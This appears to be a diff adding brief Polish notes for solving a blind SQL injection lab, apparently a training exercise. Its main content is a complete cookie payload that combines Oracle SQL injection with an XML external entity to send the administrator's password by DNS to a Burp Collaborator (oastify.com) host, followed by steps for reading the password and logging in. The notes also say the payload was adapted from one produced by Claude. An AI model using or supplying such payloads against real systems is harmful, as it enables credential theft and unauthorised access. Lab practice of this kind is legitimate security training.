@@ -1,0 +1,11 @@
+1. skan tracking id insertion point
+2. przerabiam payload z claude na moj collaborator
+3. kasuje TrackingId: hdjjnsjnsxnjsc i wklejam tylko payload
+
+
+Cookie: TrackingId=xyz'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.0cdlp4tz2gm5j908w8c4qshvnmtdh35s.oastify.com/">%25remote%3b]>'),'/l')+FROM+dual)||'; session=5OAF93BfRrnSwFtC2BMUAEeAcgNNYYn6
+
+
+
+
+biore tą pierwszą cześć hasloadministrtora.xnjwd.oastify i sie loguje
